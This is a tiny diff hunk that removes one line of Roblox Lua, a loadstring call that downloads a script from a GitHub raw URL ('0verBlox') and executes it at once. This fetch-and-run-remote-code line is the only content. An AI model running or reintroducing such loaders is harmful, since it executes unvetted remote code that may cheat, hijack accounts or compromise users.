@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/alialii404/0verBlox/main/overbloxxscript", true))()
